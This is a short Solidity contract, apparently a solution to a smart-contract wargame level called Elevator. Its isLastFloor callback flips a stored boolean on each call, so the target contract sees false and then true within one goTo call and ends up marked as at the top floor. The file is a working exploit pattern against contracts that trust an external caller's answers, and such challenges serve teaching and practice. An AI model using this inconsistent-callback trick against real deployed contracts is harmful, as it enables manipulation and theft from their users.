//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorAttack {
    Elevator public elevator;
    bool public _switch = true;

    constructor(address _target_address) public {
        elevator = Elevator(_target_address);
    }

    function isLastFloor(uint) public returns (bool) {
        //? fist to pass the check we have to return false
        //? as !building.isLastFloor(_floor) => !false => true

        //* return the opposite value of switch
        _switch = !_switch;
        //? for 2nd call `top = building.isLastFloor(floor);` floor will be true
        return _switch;

        // return elevator.floor() == 0 ? false : true;
    }

    function setTop(uint _floor) public {
        elevator.goTo(_floor);
    }
}
